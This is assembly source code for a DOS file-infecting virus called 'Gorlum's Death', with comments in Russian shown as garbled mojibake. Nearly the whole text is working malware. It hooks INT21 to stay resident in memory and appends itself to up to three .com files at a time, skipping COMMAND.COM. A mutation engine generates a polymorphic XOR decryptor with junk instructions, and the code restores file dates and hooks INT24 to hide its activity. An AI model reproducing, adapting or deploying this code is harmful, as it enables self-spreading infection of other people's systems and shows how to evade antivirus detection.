   ; Gorlum's Death (c) by SMT/SMF
   ; *®«¨¬®àäë© à¥§¨¤¥âë© ¥®¯ áë© ¢¨àãá, ¯®à ¦ ¥â ¤® âà¥å .com - ä ©«®¢ ¢
   ; â¥ªãé¥¬ ª â «®£¥ §  ®¤¨ ¢ë§®¢ INT21 á äãªæ¨ï¬¨ SELECT DISK ¨ EXEC PROGRAM.
   ; *® â.ª. ¢ ¯à®æ¥áá¥ à ¡®âë ¯®«ì§®¢ â¥«ì á ¬ ¬¥ï¥â ª â «®£¨ ¨ ¢ë§®¢ë INT21
   ; á«¥¤ãîâ ¤®áâ â®ç® ç áâ®, ¢¨àãá ¬®¦¥â à á¯à®áâà ¨âáï ¤®¢®«ì® ¡ëáâà® ¯®
   ; ¬®£¨¬ ä ©« ¬ ¨ ª â «®£ ¬.
   ; P¥§¨¤¥â ¢ ¯ ¬ïâ¨ ¯à¨áãâá¢ã¥â ¢ ç áâ¨ç® § è¨äà®¢ ®¬ ¢¨¤¥.


   .model tiny
   .code

           org 11ah
   Decode:
           org     100h
   start:
           db 9ch dup (90h)        ; ¬¥áâ® ¯®¤ ¯®«¨¬®àäë© à áè¨äà®¢é¨ª

   nope:   nop
           nop
           jmp Virstart

   ; -------------------- * è ®¡à ¡®âç¨ª INT21 --------------------------
   Resident:
           cmp     ah,8fh          ; …á«¨ ¯®á«  § ¯à®á   ¯à¨áãâáâ¢¨¥ ¢ ¯ ¬ïâ¨
           jne     NOQUER
           mov     ah,0fbh         ; â® ®â¢¥â¨âì ãâ¢¥à¤¨â¥«ì®
           jmp     Exit            ; ¨ ¢ë©â¨
   NOQUER: cmp     ah,0eh          ; ¥á«¨ äãªæ¨ï "select disk",
           je      OK
           cmp     ax,4b00h        ; ¨«¨ äãªæ¨ï "execute program",
           jne     Exit
                                   ; â® ¢ë¯®«¨âì ¥ª®â®àë¥ ¤¥©áâ¢¨ï ;)
   OK:
           pushf
           push    ax bx cx dx di si bp ds es sp ss
           push    cs
           pop     ds
           mov     ah,2Fh
           int     21h             ; *®«ãç ¥¬ DTA ¢ es:bx
           mov     ax,es
           mov     ds:[DTAofs],bx
           mov     ds:[DTAseg],ax  ; ‘®åà ï¥¬ DTA
           push    cs
           pop     es
           call    xorer           ; * áè¨äàã¥¬áï
           call    MAIN            ; —â®-â® á¤¥« ¥¬
           call    xorer           ; ‡ è¨äàã¥¬áï

           mov     dx,ds:[DTAofs]
           mov     ax,ds:[DTAseg]
           mov     ds,ax
           mov     ah,1Ah
           int     21h             ; ‚®ááâ  ¢«¨¢ ¥¬ DTA
           pop     ss sp es ds bp si di dx cx bx ax
           popf
   Exit:
           db      0eah            ; JMP FAR - ¯¥à¥å®¤   áâ àë© INT21
   int21of dw ?
   int21se dw ?


   ;       ------------------ ""˜ˆ”*€’Ž*"" -------------------
   xorer:
           mov     di,offset body
           mov     cx,offset virend - offset body
   megaxor:
           db 81h,35h              ; £«îª TASM'a, ª®â®àë© ¥ å®ç¥â  áá¥¬¡«¨à®¢ âì
                                   ; XOR WORD PTR [DI] (®  áá¥¬¡«¨àã¥â BYTE PTR)
   xorerv  dw 0
           inc     di
           inc     di
           loop    megaxor
           ret

   ;------------------------------------------------------------
   body:                           ; * ç «® § è¨äà. ç áâ¨

   ; --- *¥áª®«ìª® ã¯à®é¥ë© ®¡à ¡®âç¨ª Abort,Retry,Ignore ----
   INT24:  mov     al,3            ; ¢®§¢à â¨âì 'fail system call in progress'
           iret

   ; ------------------------------------------------------------
   zeroDTA:mov     word ptr ds:[DTA],0
           mov     si,offset DTA
           mov     di,offset DTA+2
           mov     cx,16h
           cld                     ; ‚á¥£® «¨èì á¯®á®¡ ®¡ã«¨âì
           rep     movsw           ; ¯¥à¢ë¥ 24 ¡ ©â  DTA
           ret
   ; ------------------------------------------------------------
   Find1st:call    zeroDTA
           mov     ah,4Eh
           xor     cx,cx
           mov     dx,ds:[cMask]
           int     21h             ; *®¨áª ¯¥à¢®£® ä ©«  ¯® ¬ áª¥ ¨§ ds:dx
           ret
   ; ------------------------------------------------------------
   FindNxt:mov     ah,4Fh
           int     21h             ; ˆé¥¬ á«¥¤ãîé¨© ä ©«
           ret
   ; ------------------------------------------------------------
   SetPoly:
           mov     cx,4Eh
           mov     si,100h
   Fill1:  mov     [si],dx         ;‡ ¯®«¥¨¥ ¬¥áâ  ¯®¤ ¯®«¨¬®àäë© à áè¨äà®¢é¨ª
           inc     si              ; ª ª¨¬¨-â® ¥áãé¥áâ¢¥ë¬¨ ¨áâàãªæ¨ï¬¨
           inc     si
           loop    Fill1
           ret
   ; ================== MAIN ROUTINE =====================
   MAIN:
           xor     ax,ax
           mov     es,ax
           mov     ax,es:[92h]
           mov     bx,es:[90h]     ; *¥à¥å¢ â ®¡à ¡®âç¨ª  ªà¨â¨ç¥áª¨å ®è¨¡®ª
           mov     ds:[int24se],ax
           mov     ds:[int24of],bx ; á®åà ¨¬ áâ àë© int24
           cli
           mov     es:[92h],ds     ; “áâ ®¢¨âì á¢®© ®¡à ¡®âç¨ª
           mov     ax,offset INT24 ; int 24
           mov     es:[90h],ax     ;
           sti
           push    ds
           pop     es
           mov     ah,1Ah
           mov     dx,offset DTA
           int     21h             ; “áâ ®¢¨¬ á¢®© DTA

           mov     byte ptr ds:[First],1   ; “áâ  ¢«¨¢ ¥¬ ¯à¨§ ª â®£®, çâ®
                                           ; ¦¥àâ¢ã  ¤® ¡ã¤¥â ¯®â®¬ § ¯ãáâ¨âì
           mov     word ptr [virln],0
           mov     ds:[counter],0          ; ®¡ã«ï¥¬ áç¥âç¨ª ¯®à ¦. ä ©«®¢
           mov     word ptr ds:[SILOD+1],offset nope
           mov     word ptr ds:[cMask],offset ComMask
           call    Find1st                 ; * ç¥¬ ¯®¨áª .com-ä ©®¢
           jnc     short found
           jmp     exitINT
   found:

   ;                       MUTATION ENGINE
   ; §¤¥áì ¯®¤£®â ¢¤¨¢ îâáï ¨áâàãªæ¨¨ ¯à®æ¥áá®à  á ãç áâ¨¥¬ à¥£¨áâà®¢
   ; ax,cx,dx,bx,bp,si,di
   ; ª ¦¤ë© à § ¢ë¡¨à ¥âáï á«¥¤ãîé¨© à¥£¨áâà, ¯®á«¥ DI á®¢  ¯¥à¥å®¤¨¬ ª AX

           cmp     byte ptr ds:[RGLOD],0BFh        ; ¥á«¨ ¥ DI....
           jne     NxtReg                          ; ¯¥à¥å®¤¨¬ ª á«¥¤.
                                                   ; ¨ ç¥ á®¢  AX
           mov     byte ptr ds:[RGINC],3Fh         ; ª®¤,   1 ¬¥ìè¨©, ç¥¬ ã¦®
           nop
           mov     byte ptr ds:[RGLOD],0B7h        ; ª®¤,   1 ¬¥ìè¨©, ç¥¬ ã¦®
           mov     byte ptr ds:[RGPUSH],4Fh        ; ª®¤,   1 ¬¥ìè¨©, ç¥¬ ã¦®
   NxtReg:                                 ; ¢ë¡®à á«¥¤ãîé¥£® à¥£¨áâà  ¨§ á¯¨áª ...
           inc     byte ptr ds:[RGINC]     ; ¯®«ãç ¥¬ ã¦ë© ª®¤ ¤«ï á«¥¤. à¥£¨áâà 
           inc     byte ptr ds:[RGLOD]     ; ¯®«ãç ¥¬ ã¦ë© ª®¤ ¤«ï á«¥¤. à¥£¨áâà 
           inc     byte ptr ds:[RGPUSH]    ; ¯®«ãç ¥¬ ã¦ë© ª®¤ ¤«ï á«¥¤. à¥£¨áâà 
           cmp     byte ptr ds:[RGINC],44h ; à¥£¨áâà SP ¯à®¯ãáª ¥¬,
           je      NxtReg                  ;  ¯®â®¬ã çâ® ¤«ï ¥£® ¥â ª®¬ ¤ë PUSH

           mov     si,offset FName
           mov     di,offset command
           mov     cx,0Bh
           cld
           repe    cmpsb           ; áà ¢¥¨¥  ©¤¥®£® ¨¬¥¨ á 'COMMAND.COM'
           jnz     notCOMMAND
           jmp     nxtfile         ; ¥ ¯®à ¦ ¥¬ COMMAND.COM
   notCOMMAND:
           mov     ax,3D02h
           mov     dx,offset FName
           int     21h             ; ®âªàë¢ ¥¬  ©¤¥ë© ä ©«
           jnc     OpenOK
           jmp     nxtfile         ; ¥ ®âªàë«áï - ¯¥à¥å®¤¨¬ ª á«¥¤ãîé¥¬ã, ¥
                                   ; § ¤¥à¦¨¢ ¥¬ ¯à®æ¥áá § à ¦¥¨ï !-)
   OpenOK:
           mov     bx,ax           ; § ¯®¬¨ ¥¬ handle ®âªàëâ®£® ä ©« 
           mov     ah,3Fh          ; äãªæ¨ï çâ¥¨ï ¨§ ä ©« 
           mov     cx,7            ; ç¨â ¥¬ ¯¥à¢ë¥ 7 ¡ ©â
           mov     dx,offset OldShit
           int     21h             ; ‘ç¨âë¢ ¥¬ ¨ § ¯®¬¨ ¥¬  ç «® ä ©« 
           cmp     byte ptr ds:[OldShit+4],0C3h ; *à®¢¥àª    ¯®¢â®à®¥ § à ¦¥¨¥
           jne     Clean
           mov     ah,3Eh          ; äãªæ¨ï § ªàëâ¨ï ä ©« 
           int     21h             ; “¦¥ ¯®à ¦¥ - § ªàë¢ ¥¬ ¨ ¥ ¡¥á¯®ª®¨¬
           jmp     nxtfile

   Clean:  inc     ds:[counter]    ; ¯®¤áç¥â ç¨á«  ¯®à ¦¥ëå §  ®¤¨ à § ä ©«®¢
           mov     ax,4202h
           xor     cx,cx
           xor     dx,dx
           int     21h             ; *¥à¥å®¤ ª ª®æã ä ©« 
           mov     word ptr ds:[virln],ax   ; ‡ ¯®¬¨¬ ¤«¨ã ä ©«  ¦¥àâ¢ë
           add     ax,offset nope
           mov     word ptr ds:[SILOD+1],ax ; ‡ ¯®¬¨¬  ç «® § è¨äà. ª®¤ 
           mov     ax,4200h
           xor     cx,cx
           xor     dx,dx
           int     21h             ; *¥à¥å®¤ ª  ç «ã ä ©« 

           mov     ax,word ptr ds:[DTA+1ah] ; ã§ «¨ à §¬¥à ä ©«  ¨§ DTA ¯®¨áª 
           add     ax,100h                  ; ã§ «¨ áâ àâ®¢ë©  ¤à¥á ¢¨àãá 
           mov     word ptr ds:[RGLOD+1],ax ; ¨§¬¥¨«¨ áâ àâ®¢ë© ª®¤ ¢¨àãá 

           mov     ah,40h          ; § ¯¨áì ¢ ä ©«
           mov     cx,7
           mov     dx,offset RGLOD
           int     21h             ; ‚  ç «® ä ©«  § ¯¨è¥¬ ¯¥à¥å®¤
                                   ;   â¥«® ¢¨àãá 

           mov     ax,4202h
           xor     cx,cx
           xor     dx,dx
           int     21h             ; *¥à¥å®¤ ª ª®æã ä ©« 

           push    bx
           cmp     ds:[AddSize],100h       ; * §¬¥à ¤®¯¨áë¢ ¥¬®£® ¬ãá®à 
           je      ClearGarbage            ; ¥ ¡®«¥¥ 100h
           inc     ds:[AddSize]            ; “¢¥«¨ç¨¬ à §¬¥à ¤®¯¨áë¢ ¥¬®£® ¬ãá®à 
           inc     word ptr ds:[CXLOD+1]   ; “¢¥«¨ç¨¬ à §¬¥à § è¨äà®¢ ®© ç áâ¨
           jmp     sizeOK

   ClearGarbage:
           mov     ds:[AddSize],0          ; ®¡ã«¨âì à §¬¥à ¤®¯¨áë¢ ¥¬®£® ¬ãá®à 
           sub     word ptr ds:[CXLOD+1],100h
   sizeOK:

   ;       € «®£¨ç® ¯¥à¢®© MUTATION ENGINE:
   ;               ¢ë¡®à à¥£¨áâà  ¨§ SI/DI

           cmp     byte ptr ds:[incSI],47h
           jne     SelectDI                ; ¥á«¨ ¢ ¯à®è«ë© à § ¡ë« DI,
           dec     byte ptr ds:[incSI]     ; â® á¥©ç á ¢ë¡à âì SI
           dec     byte ptr ds:[xorSI+1]
           dec     byte ptr ds:[SILOD]
           dec     byte ptr ds:[Si1]
           dec     byte ptr ds:[Si2+1]
           jmp     Reg1
   SelectDI:
           inc     byte ptr ds:[incSI]     ; ¨ ç¥ ¢ë¡à âì DI
           inc     byte ptr ds:[xorSI+1]
           inc     byte ptr ds:[SILOD]
           inc     byte ptr ds:[Si1]
           inc     byte ptr ds:[Si2+1]
   Reg1:

   ; ‚ § ¢¨á¨¬®áâ¨ ®â ¨á¯®«ì§ã¥¬®£® à¥£¨áâà  ¢ë¡¨à ¥¬ ¨ç¥£® ¥ ¨§¬¥ïîéãî
   ; ¨áâàãªæ¨î, ª®â®à®© § ¯®«ï¥¬ ¬¥áâ® ¬¥¦¤ã ª®¬ ¤ ¬¨ ¯®«¨¬®àä®£® à áè¨äà®¢é¨ª 

           mov     dh,byte ptr ds:[RGINC]
           cmp     dh,48h                  ; dec ax
           jne     noAX
           mov     dh,40h                  ; inc ax
   noAX:
           cmp     dh,41h                  ; inc cx
           jne     noCX
           mov     dh,48h                  ; dec ax
   noCX:
           cmp     dh,47h                  ; inc di
           jne     noDI
           mov     dh,4Bh                  ; dec bx
   noDI:
           cmp     dh,46h                  ; inc si
           jne     noSI
           mov     dh,0FBh                 ; sti
   noSI:

           mov     dl,dh                   ; § ¯®«ï¥¬ ¢ë¡à ®© ª®¬ ¤®©
           call    SetPoly                 ; ª®¤ ¯®«¨¬®àä®£® à áè¨äà®¢é¨ª 

           mov     ah,byte ptr ds:[incSI]
           mov     bx,word ptr ds:[RandSeed] ; ¯à¥¤. § ç¥¨¥ £¥¥à â®à 
           cmp     bh,0                      ; ¯á¥¢¤®á«ãç ©ëå ç¨á¥«
           jne     RNDZ
           mov     bh,63h
           xor     bl,bl
   RNDZ:
           inc     bl
           dec     bh
           mov     cl,bl
           xor     ch,ch
           mov     si,12eh                 ; áâ ¢¨¬  inc REG  ªã¤ -¨¡ã¤ì
                                           ; ¯®á«¥ 12eh
           push    si
           push    si
           add     si,cx
           mov     [si],ah
           pop     si
           mov     cl,bh
           xor     ch,ch
           add     si,cx
           mov     [si],ah                 ; áâ ¢¨¬  inc REG  ªã¤ -¨¡ã¤ì
                                           ; ¯®á«¥ 12eh
           mov     word ptr ds:[RandSeed],bx
           pop     si
           mov     ax,word ptr ds:[RndSeed2] ; ¯¥à¥¬¥ ï ¤«ï ¤àã£®£®
           cmp     ax,5Fh                  ; £¥¥à â®à  ¯á¥¢¤®á«ãç ©ëå ç¨á¥«
           jne     RND2
           mov     ax,0Ah
   RND2:
           inc     ax
           add     si,ax
           mov     dx,word ptr ds:[xorSI]
           mov     [si],dx                 ; áâ ¢¨¬ ªã¤ -¨¡ã¤ì xor si,nnnn
           mov     word ptr ds:[RndSeed2],ax
           mov     ax,word ptr ds:[RndSeed3]
           cmp     ax,11h
           jne     RND3
           xor     ax,ax
   RND3:
           inc     ax
           mov     di,106h
           add     di,ax
           mov     si,offset SILOD
           mov     cx,3
           rep     movsb   ; ªã¤ -¨¡ã¤ì ¡«¨¦¥ ª  ç «ã áâ ¢¨¬ mov REG,start
           mov     word ptr ds:[RndSeed3],ax
           mov     ax,word ptr ds:[RndSeed4]
           cmp     ax,0
           jne     RND4
           mov     ax,11h
   RND4:
           dec     ax
           mov     di,11ah
           add     di,ax
           mov     si,offset CXLOD
           mov     cx,3
           rep     movsb          ; ªã¤ -¨¡ã¤ì ¡«¨¦¥ ª  ç «ã áâ ¢¨¬ mov cx,len
           mov     word ptr ds:[RndSeed4],ax
           mov     ax,word ptr ds:[RndSeed5]
           cmp     ax,0
           jne     RND5
           mov     ax,8
   RND5:
           dec     ax
           mov     di,192h
           add     di,ax
           mov     dl,0E2h
           xor     ch,ch                   ; Zero register
           mov     cl,9Ah
           sub     cx,ax
           mov     dh,cl
           mov     [di],dx                 ; ¡«¨¦¥ ª ª®æã áâ ¢¨¬ loop ¢  ç «®
           mov     word ptr ds:[RndSeed5],ax
           mov     ah,2Ch
           int     21h                     ; á¬®âà¨¬   ç áë...
           mov     si,130h
           add     si,word ptr ds:[RndSeed2]
           mov     [si],dx     ; áª®«ìª® á¥ªã¤  â¨ª «® - á â¥¬ ç¨á«®¬ ¨ XOR'¨¬
           push    dx
           mov     word ptr ds:[xorerv],0  ; ª®£¤ -¨¡ã¤ì ®¢ ï ª®¯¨ï à¥§¨¤¥â 
                                           ; § à ¡®â ¥â (?), ¨ ®  ¯®ª  ¥ § XOR¥ 
           mov     si,100h
           mov     di,offset virend
           mov     cx,virlen
           cld
           rep     movsb                   ; ¯¥à¥®á¨¬ ª®¯¨î ¢¨àãá  ¢ ª®¥æ ¢¨àãá 
           pop     dx
           mov     word ptr ds:[xorerv],dx ; ¢ë¡¨à ¥¬ ®¢ãî ª®áâ âã ¤«ï
                                           ; ¯¥à¥è¨äà®¢ª¨ à¥§¨¤¥â 
   Si1:    mov     si,offset virend
   Si2:    add     si,offset nope - offset start

           mov     byte ptr ds:[nope-1],0C3h       ; ‘â ¢¨¬ RET ¯®á«¥ è¨äà®¢é¨ª 
           call    Decode  ; call 11a
           mov     byte ptr ds:[nope-1],90h        ; ‚®ááâ  ¢«¨¢ ¥¬ è¨äà®¢é¨ª

           pop     bx
           mov     cx,virlen
           add     cx,ds:[AddSize]
           mov     dx,offset virend
           mov     ah,40h  ; ¤®¯¨áë¢ ¥¬ ¢¨àãá ª ä ©«ã á ãç¥â®¬ ¬ãá®à 
           int     21h
           mov     ax,5701h
           mov     cx,word ptr ds:[DTA+16]
           mov     dx,word ptr ds:[DTA+18]
           int     21h     ; ¢®ááâ  ¢«¨¢ ¥¬ áâ àë¥ ¤ âã/¢à¥¬ï á®§¤ ¨ï ä ©« 
           mov     ah,3Eh
           int     21h     ; § ªàë¢ ¥¬ ®â¬ãç ¢è¨©áï ä ©«

   ; ---------- ¯®¨áª ¨ ®¡à ¡®âª  á«¥¤ãîé¥£® ä ©«  ------------
   nxtfile:cmp     ds:[counter],3          ; ‡  ®¤¨ à § ¯®à ¦ ¥¬ ¥
           je      exitINT                 ; ¡®«¥¥ 3x ä ©«®¢ :(
           call    FindNxt
           jc      exitINT
           jmp     found

   ;--------------- ¢ëå®¤ ¨§ £« ¢®© ¯à®æ¥¤ãàë ----------------
   exitINT:
           xor     ax,ax
           mov     es,ax
           cli
           mov     ax,ds:[int24se]
           mov     bx,ds:[int24of]
           mov     es:[92h],ax
           mov     es:[90h],bx             ; ¢®ááâ ®¢¨¬ int24
           sti
           xor     dx,dx
           call    SetPoly         ; ‘®ªàëâ¨¥ ¯®¯ëâ®ª ¯®áâà®¥¨ï ¯®«¨¬®àä 
                                   ; ( “¨çâ®¦¥¨¥ ¯®áâà®¥®£® à áè¨äà®¢é¨ª  )
           ret

   ; =============== ‘î¤  ¯®¯ ¤ ¥¬ ¯®á«¥ à áè¨äà®¢ª¨ ===================
   virstart:
           mov     bp,0
   virln   equ     $-2             ; ‡¤¥áì ¡ã¤¥â åà ¨âáï ¤«¨  ¦¥àâ¢ë
           mov     ax,ds:[2ch]     ; * è«¨ á¥£¬¥â á ¯¥à¥¬¥ë¬¨ áà¥¤ë
           mov     [bp+envseg],ax
   ;       mov     [bp+v643h],cs
   ;       mov     [bp+v647h],cs
   ;       mov     [bp+v63Fh],cs
           mov     ah,8Fh
           int     21h     ; *à®¢¥àï¥¬, ¥áâì «¨ à¥§¨¤¥â ¢ ¯ ¬ïâ¨:
           cmp     ah,0FBh ; …á«¨ "á¢®ï" äãªæ¨ï ¢®§¢à é ¥â 0FBh - ¢ëå®¤
           jne     NOQUIT
           jmp     DOS
   NOQUIT:
   ;        --------------- “‘’€*Ž‚Š€ *…‡ˆ„…*’€ ---------------
           mov     ax,cs
           dec     ax
           mov     ds,ax                   ; *à®¢¥àï¥¬ MCB ¯à®£à ¬¬ë
           cmp     byte ptr ds:[0],5Ah     ; …á«¨ ¡«®ª ¥ ¯®á«¥¤¨©, â® ¢¥àåïï
           jne     short DOS       ; ç áâì ¯ ¬ïâ¨ áª®à¥¥ ¢á¥£® § ïâ  - Ž*‹ŽŒ :(
                                   ; (¯à¨ ¯®¯ëâª¥ § ïâì ¯ ¬ïâì ®  áâ ¥â á¥£¬¥â¨à®¢ ®©)
           mov     ax,ds:[3]       ; Ž¡¬ ë¢ ¥¬ DOS - ã¬¥ìè ¥¬ à §¬¥à ¯à®£à ¬¬ë,
           sub     ax,(virlen/8)   ; ¯®á«¥ § ¢¥àè¥¨ï ¥ ¢áï ¯ ¬ïâì
           mov     ds:[3],ax       ; ®á¢®¡®¤¨âáï, ®¡à §ã¥âáï ¯®â¥àïë© ¡«®ª,
           mov     bx,ax           ; ªã¤  ¬ë ¨ áã¥¬ à¥§¨¤¥â
           mov     ax,es
           add     ax,bx
           mov     es,ax           ; es=á¥£¬¥â, ªã¤  ¡ã¤¥â ãáâ ®¢«¥ à¥§¨¤¥â
           mov     si,bp
           add     si,100h
           mov     cx,2A4h
           mov     ax,ds
           inc     ax
           mov     ds,ax
           mov     di,100h
           cld
           rep     movsw      ; ª®¯¨àã¥¬ ¢¨àãá ¢ ¢¥àåîî ç áâì ¯ ¬ïâ¨ (¢ es:100)
           push    es
           pop     ds
           xor     ax,ax
           mov     es,ax
           mov     ax,es:[86h]
           mov     bx,es:[84h]     ; ‚ ax:bx -  ¤à¥á ®¡à ¡®âç¨ª  INT21
           mov     ds:[int21se],ax
           mov     ds:[int21of],bx ; ‘®åà ï¥¬ áâ àë©  ¤à¥á INT21
           cli
           mov     es:[86h],ds
           mov     ax,offset Resident      ; “áâ  ¢«¨¢ ¥¬ ®¢ë© ®¡à ¡®âç¨ª,
           mov     es:[84h],ax             ; ¡®«¥¥ ¯à®¤¢¨ãâë© ;)
           sti

   DOS:
           push    cs
           pop     ds
           push    cs
           pop     es
           cmp     byte ptr [bp+First],1   ; …á«¨ íâ® ¯¥à¢ë© § ¯ãáª ¨§ ¨áâ ««ïâ®à ,
           je      short RUN
           mov     ah,4Ch                  ; â® ¦¥àâ¢ë ¥â
           int     21h

   RUN:    mov     si,bp
           mov     cx,7
           add     si,offset Oldshit       ; ‚®ááâ ®¢¨¬  ç «® ¦¥àâ¢ë
           mov     di,100h
           cld
           rep     movsb
           mov     ax,100h
           push    ax
           retn                            ; „ ¤¨¬ ¦¥àâ¢¥ ¯®àã«¨âì...

   Oldshit db 7 dup (0)                    ; ¬¥áâ® ¤«ï åà ¥¨ï  ç «  ¦¥àâ¢ë



   command db 'COMMAND.COM'
   RGINC:  inc si
   SILOD:  mov si,800h
   CXLOD:  mov cx,virlen
   RGLOD:  mov si,4a2h
   RGPUSH: push si
           ret
   incSI:  inc si
   xorSI:  xor word ptr ds:[SI],1234H

   ComMask db '*.com',0

   First   db 0
   envseg  dw ?
   int24of dw ?
   int24se dw ?
   DTAseg  dw ?
   DTAofs  dw ?
   counter dw ?
   AddSize dw 1
   RandSeed dw 5310h
   RndSeed2 dw 2bh
   RndSeed3 dw 10h
   RndSeed4 dw 7
   RndSeed5 dw 1

   cMask   dw ?                            ; ‡¤¥áì ¯àïç¥¬  ¤à¥á ¬ áª¨ .com-ä ©« 

   DTA     dw 18h dup (0)
   FName   equ DTA+1eh                     ; * ©¤¥®¥ ¨¬ï .com-ä ©« 

   virlen  equ $-start
   virend  label
           end     start
